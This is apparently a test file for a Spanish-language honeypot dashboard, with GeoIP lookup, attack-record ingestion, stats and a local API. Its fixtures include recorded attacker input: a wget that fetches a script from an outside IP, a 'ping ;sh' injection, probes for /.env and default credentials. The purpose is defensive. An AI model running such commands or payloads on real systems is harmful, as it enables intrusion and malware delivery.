import { afterAll, describe, expect, test } from "bun:test";
import { startApi } from "../src/api";
import { type AttackRecord, describeAttack, GeoIp } from "../src/attacks";
import { config } from "../src/config";
import { openContext } from "../src/context";
import { downloadsEmbed } from "../src/embeds";
import type { LogBatch } from "../src/logs";

const H = 3600_000;
const NOW = Date.now();

const TSV = [
  "1.0.0.0\t1.0.0.255\t13335\tUS\tCLOUDFLARENET",
  "5.0.0.0\t5.255.255.255\t0\tNone\tNot routed",
  "45.0.0.0\t45.0.255.255\t14061\tNL\tDIGITALOCEAN-ASN",
  "193.187.110.0\t193.187.110.255\t44477\tRU\tSTARK-INDUSTRIES",
].join("\n");

const batch = (hoursAgo: number, attacks: AttackRecord[], over: Partial<LogBatch> = {}): LogBatch => ({
  id: 10_000 - hoursAgo * 12,
  at: new Date(NOW - hoursAgo * H).toISOString(),
  seed: false,
  ufw_blocks: 0,
  patterns: [],
  attacks,
  ...over,
});

describe("geoip", () => {
  const geo = GeoIp.fromTsv(TSV);
  test("país y red por rango, sin las redes no enrutadas", () => {
    expect(geo.size).toBe(3);
    expect(geo.lookup("193.187.110.159")).toEqual({ country: "RU", asn: 44477, asName: "STARK-INDUSTRIES" });
    expect(geo.lookup("45.0.0.1").country).toBe("NL");
    expect(geo.lookup("5.1.2.3").asn).toBeNull();
    expect(geo.lookup("8.8.8.8").country).toBeNull();
    expect(geo.lookup("no-es-ip").country).toBeNull();
  });
});

describe("ataques", () => {
  test("acumula, pone país y el lote semilla no entra en la línea de tiempo ni en el feed", () => {
    const { attacks } = openContext(":memory:");
    attacks.geo = GeoIp.fromTsv(TSV);
    attacks.ingest([
      batch(30, [{ kind: "sftp", ip: "193.187.110.159", count: 500, users: { root: 480, admin: 20 } }], { seed: true }),
    ]);
    expect(attacks.summary(48).linea_de_tiempo).toEqual([]);
    attacks.ingest([
      batch(2, [{ kind: "sftp", ip: "193.187.110.159", count: 10, users: { root: 10 } }], { sftp_failed_other: 7 }),
      batch(1, [{ kind: "web", ip: "45.0.0.9", count: 2, paths: { "GET /.env": 2 }, status: { "404": 2 } }]),
    ]);
    const s = attacks.summary(24);
    expect(s.intentos_por_tipo).toEqual({ sftp: 10, "sftp-anonimo": 7, web: 2 });
    expect(s.ips_distintas).toBe(2);
    expect(s.top_ips[0]).toMatchObject({ ip: "193.187.110.159", attempts: 510, country: "RU" });
    // Las tablas van por ventana: la semilla (sin fecha) no entra.
    expect(s.usuarios[0]).toEqual({ kind: "sftp", username: "root", n: 10 });
    expect(s.rutas_web).toEqual([{ path: "GET /.env", n: 2 }]);
    expect(s.feed.map((f) => f.text)).toEqual(["pidió GET /.env", "probó el usuario root"]);
  });

  test("una descarga nueva del honeypot avisa una sola vez; credenciales y comandos", () => {
    const { attacks } = openContext(":memory:");
    const rec: AttackRecord = {
      kind: "ssh",
      ip: "45.0.0.7",
      count: 3,
      creds: { "root:123456": 2, "admin:a:b": 1 },
      commands: ["uname -a", "wget http://45.0.0.7/x.sh"],
      downloads: [{ url: "http://45.0.0.7/x.sh", sha256: "ab".repeat(32) }],
      logins_ok: 1,
    };
    const first = attacks.ingest([batch(1, [rec])]);
    expect(first).toEqual([
      { kind: "descarga", ip: "45.0.0.7", country: null, url: "http://45.0.0.7/x.sh", sha256: "ab".repeat(32) },
    ]);
    expect(attacks.ingest([batch(0.5, [rec])])).toEqual([]);
    const s = attacks.summary(24);
    expect(s.credenciales).toContainEqual({ username: "admin", password: "a:b", n: 2 });
    expect(s.comandos.map((c) => c.cmd).sort()).toEqual(["uname -a", "wget http://45.0.0.7/x.sh"]);
    expect(s.descargas[0]?.n).toBe(2);
    const e = downloadsEmbed(first).toJSON();
    expect(e.description).toContain("hxxp://45[.]0[.]0[.]7/x[.]sh");
  });

  test("las IPs sin país se completan al cargar la base", () => {
    const { attacks } = openContext(":memory:");
    attacks.ingest([batch(1, [{ kind: "sftp", ip: "193.187.110.1", count: 1 }])]);
    attacks.geo = GeoIp.fromTsv(TSV);
    expect(attacks.backfillGeo()).toBe(1);
    expect(attacks.summary(24).top_ips[0]?.country).toBe("RU");
  });

  test("las IPs propias que llegan en el lote se borran de lo ya guardado", () => {
    const { attacks } = openContext(":memory:");
    attacks.ingest([batch(2, [{ kind: "ssh", ip: "45.0.0.50", count: 0, sessions: 2, commands: ["ls"] }])]);
    expect(attacks.summary(24).ips_distintas).toBe(1);
    attacks.ingest([batch(1, [{ kind: "ssh", ip: "45.0.0.7", count: 1 }], { own_ips: ["45.0.0.50"] })]);
    const s = attacks.summary(24);
    expect(s.top_ips.map((r) => r.ip)).toEqual(["45.0.0.7"]);
    expect(s.feed.map((f) => f.ip)).toEqual(["45.0.0.7"]);
    expect(s.comandos).toEqual([]);
  });

  test("hora real de cada evento, tablas por ventana y textos limpios", () => {
    const { attacks } = openContext(":memory:");
    // Un lote de hace 30 h y otro de ahora con dos IPs que atacaron a horas distintas.
    attacks.ingest([
      batch(30, [{ kind: "telnet", ip: "45.0.0.1", count: 5, users: { viejo: 5 }, creds: { "viejo:x": 5 }, commands: ["sh"] }]),
      batch(0, [
        { kind: "telnet", ip: "45.0.0.2", count: 3, ts: NOW - 4 * 60_000, creds: { "enable\\x00:linuxshell\\x00": 3 }, commands: ["ping ;sh", "sh", "sh", "sh"] },
        { kind: "ssh", ip: "45.0.0.3", count: 2, ts: NOW - 20 * 60_000, creds: { "root:": 2 }, commands: ["ping;  sh"] },
        { kind: "ssh", ip: "45.0.0.4", count: 1, ts: NOW + 3 * H, creds: { "a:b": 1 } },
      ]),
    ]);
    const s = attacks.summary(24);
    expect(s.feed.map((f) => f.ip)).toEqual(["45.0.0.4", "45.0.0.2", "45.0.0.3", "45.0.0.1"]);
    expect(s.feed[1]?.ts).toBe(NOW - 4 * 60_000);
    // La hora imposible (futura) se cambia por la del lote.
    expect(s.feed[0]?.ts).toBe(NOW);
    expect(s.ultimos_10_min).toBe(4);
    expect(s.usuarios).toEqual([]);
    expect(s.credenciales[0]).toEqual({ username: "enable", password: "linuxshell", n: 3 });
    expect(s.comandos.map((c) => [c.cmd, c.n])).toEqual([["sh", 3], ["ping; sh", 2]]);
    expect(s.contrasenas.total).toBe(6);
    expect(attacks.summary(48).comandos.find((c) => c.cmd === "sh")?.n).toBe(4);
    expect(attacks.summary(48).usuarios).toEqual([{ kind: "telnet", username: "viejo", n: 5 }]);
  });

  test("el recolector rehace una vez las tablas por ventana desde sus logs", () => {
    const { attacks } = openContext(":memory:");
    attacks.ingest([batch(1, [{ kind: "ssh", ip: "45.0.0.2", count: 2, creds: { "root:viejo": 2 } }])]);
    attacks.ingest([
      batch(0, [{ kind: "ssh", ip: "45.0.0.2", count: 1, creds: { "root:nuevo": 1 } }], {
        stats_rebuild: {
          kinds: ["sftp", "web", "ssh", "telnet"],
          until: NOW,
          attacks: [
            { kind: "ssh", ip: "45.0.0.2", count: 2, ts: NOW - 1 * H, creds: { "root:viejo": 2 } },
            { kind: "telnet", ip: "45.0.0.5", count: 40, ts: NOW - 5 * 24 * H, creds: { "admin:admin": 40 }, commands: ["sh"] },
            { kind: "ssh", ip: "45.0.0.6", count: 9, ts: NOW - 40 * 24 * H, creds: { "muy:viejo": 9 } },
          ],
        },
      }),
    ]);
    // Lo de hace 1 h no se cuenta dos veces; lo de hace 40 días no entra.
    expect(attacks.summary(24).credenciales).toEqual([
      { username: "root", password: "viejo", n: 2 },
      { username: "root", password: "nuevo", n: 1 },
    ]);
    const week = attacks.summary(168);
    expect(week.credenciales[0]).toEqual({ username: "admin", password: "admin", n: 40 });
    expect(week.contrasenas.total).toBe(43);
    expect(attacks.summary(720).credenciales.some((c) => c.username === "muy")).toBe(false);
  });

  test("descripción para el feed", () => {
    expect(describeAttack({ kind: "ssh", ip: "x", count: 2, creds: { "root:root": 2 } })).toBe("probó root:root");
    expect(describeAttack({ kind: "telnet", ip: "x", count: 0, sessions: 1 })).toBe("se conectó");
  });
});

describe("API de la oficina", () => {
  const ctx = openContext(":memory:");
  const server = startApi(ctx, 0);
  const base = `http://127.0.0.1:${server.port}`;
  afterAll(() => server.stop(true));

  test("solo lectura y solo en 127.0.0.1", async () => {
    expect(server.hostname).toBe("127.0.0.1");
    expect((await fetch(`${base}/api/state`, { method: "POST" })).status).toBe(405);
    expect((await fetch(`${base}/api/nada`)).status).toBe(404);
  });

  test("estado: sin snapshot, los personajes se ausentan y la bandeja lo dice", async () => {
    const s = (await (await fetch(`${base}/api/state`)).json()) as {
      desks: Array<{ id: string; mood: string }>;
      inbox: Array<{ text: string }>;
    };
    expect(s.desks.map((d) => d.id)).toEqual(["archivero", "proyeccionista", "repartidor", "guardia", "secretario"]);
    expect(s.desks.find((d) => d.id === "archivero")?.mood).toBe("away");
    expect(s.inbox[0]?.text).toContain("no se pudo leer");
  });

  test("hook de Claude Code: con token, 204 sin cuerpo y la sesión sale en el estado", async () => {
    const post = (auth: string | null) =>
      fetch(`${base}/api/claude/hook`, {
        method: "POST",
        headers: auth ? { Authorization: auth } : {},
        body: JSON.stringify({ session_id: "x", cwd: "/p/oficina", hook_event_name: "UserPromptSubmit" }),
      });
    const prev = config.claudeHookToken;
    config.claudeHookToken = "";
    expect((await post("Bearer ")).status).toBe(401); // sin token configurado, desactivado
    config.claudeHookToken = "t0ken";
    try {
      expect((await post(null)).status).toBe(401);
      expect((await post("Bearer otro")).status).toBe(401);
      const ok = await post("Bearer t0ken");
      expect(ok.status).toBe(204);
      expect(await ok.text()).toBe("");
      const s = (await (await fetch(`${base}/api/state`)).json()) as { claude: Array<{ project: string }> };
      expect(s.claude.map((c) => c.project)).toEqual(["oficina"]);
      expect(ctx.events.recent(1)[0]?.type).toBe("claude.start");
    } finally {
      config.claudeHookToken = prev;
    }
  });

  test("honeypot con la ventana limitada", async () => {
    const h = (await (await fetch(`${base}/api/honeypot?horas=99999`)).json()) as { ventana_horas: number };
    expect(h.ventana_horas).toBe(720);
  });

  test("eventos por SSE: llega el estado nada más conectar", async () => {
    const res = await fetch(`${base}/api/events`);
    expect(res.headers.get("content-type")).toBe("text/event-stream");
    const reader = res.body?.getReader();
    const { value } = (await reader?.read()) ?? {};
    expect(new TextDecoder().decode(value)).toStartWith("event: state\n");
    await reader?.cancel();
  });
});

describe("dashboard del honeypot", () => {
  test("nuevas frente a reincidentes, redes, calor de 7 días y ficha de IP", () => {
    const { attacks } = openContext(":memory:");
    attacks.geo = GeoIp.fromTsv(TSV);
    // Una IP que ya venía hace 3 días y vuelve hoy; otra nueva de hoy.
    attacks.ingest([batch(72, [{ kind: "sftp", ip: "193.187.110.159", count: 4, users: { root: 4 } }])]);
    attacks.ingest([
      batch(2, [
        { kind: "sftp", ip: "193.187.110.159", count: 6 },
        { kind: "ssh", ip: "45.0.0.7", count: 2, sessions: 1, logins_ok: 1, commands: ["uname -a"] },
      ]),
    ]);
    const s = attacks.summary(24);
    expect(s.ips_distintas).toBe(2);
    expect(s.ips_nuevas).toBe(1);
    expect(s.ips_reincidentes).toBe(1);
    expect(s.honeypot_sesiones).toBe(1);
    expect(s.honeypot_logins).toBe(1);
    expect(s.redes[0]).toMatchObject({ as_name: "STARK-INDUSTRIES", country: "RU", attempts: 10 });
    expect(s.por_hora_7d.reduce((a, r) => a + r.n, 0)).toBe(12);

    const d = attacks.ipDetail("45.0.0.7");
    expect(d).toMatchObject({ ip: "45.0.0.7", country: "NL", intentos: 2 });
    expect(d?.comandos.map((c) => c.cmd)).toEqual(["uname -a"]);
    expect(d?.actividad[0]?.text).toBe("ejecutó: uname -a");
    expect(attacks.ipDetail("8.8.8.8")).toBeNull();
  });
});

describe("API: ficha de IP", () => {
  const ctx = openContext(":memory:");
  const server = startApi(ctx, 0);
  const base = `http://127.0.0.1:${server.port}`;
  afterAll(() => server.stop(true));

  test("valida la IP y da 404 si no se ha visto", async () => {
    expect((await fetch(`${base}/api/honeypot/ip?ip=<script>`)).status).toBe(400);
    expect((await fetch(`${base}/api/honeypot/ip?ip=1.2.3.4`)).status).toBe(404);
    ctx.attacks.ingest([batch(1, [{ kind: "web", ip: "1.2.3.4", count: 1, paths: { "GET /.env": 1 } }])]);
    const d = (await (await fetch(`${base}/api/honeypot/ip?ip=1.2.3.4`)).json()) as { intentos: number; baneada_en: string[] };
    expect(d.intentos).toBe(1);
    expect(d.baneada_en).toEqual([]);
  });
});

describe("contraseñas y clientes SSH", () => {
  test("longitud y tipo ponderados por veces", async () => {
    const { passwordStats } = await import("../src/attacks");
    const s = passwordStats([
      { password: "123456", n: 10 },
      { password: "admin", n: 3 },
      { password: "Passw0rd!", n: 1 },
      { password: "", n: 2 },
      { password: "x".repeat(20), n: 1 },
    ]);
    expect(s.total).toBe(17);
    expect(s.longitud).toEqual({ "6": 10, "5": 3, "9": 1, "0": 2, "16+": 1 });
    expect(s.tipo).toEqual({ vacia: 2, solo_numeros: 10, solo_letras: 4, letras_y_numeros: 0, con_simbolos: 1 });
  });

  test("clientes SSH por número de IPs", () => {
    const { attacks } = openContext(":memory:");
    attacks.ingest([
      batch(1, [
        { kind: "ssh", ip: "45.0.0.1", count: 1, client: "SSH-2.0-Go" },
        { kind: "ssh", ip: "45.0.0.2", count: 1, client: "SSH-2.0-Go" },
        { kind: "ssh", ip: "45.0.0.3", count: 1, client: "SSH-2.0-libssh_0.9.6" },
      ]),
    ]);
    expect(attacks.summary(24).clientes).toEqual([
      { client: "SSH-2.0-Go", ips: 2 },
      { client: "SSH-2.0-libssh_0.9.6", ips: 1 },
    ]);
  });
});

describe("archivos subidos al honeypot", () => {
  test("cuentan como archivo cazado y el feed dice que lo subió", () => {
    const { attacks } = openContext(":memory:");
    const rec: AttackRecord = { kind: "ssh", ip: "92.118.39.71", count: 0, downloads: [{ url: "subido: /root/.16", sha256: "cd".repeat(32) }] };
    expect(describeAttack(rec)).toBe("subió el archivo /root/.16");
    const n = attacks.ingest([batch(1, [rec])]);
    expect(n[0]?.url).toBe("subido: /root/.16");
    expect(attacks.summary(24).descargas[0]).toMatchObject({ url: "subido: /root/.16", ip: "92.118.39.71" });
  });
});
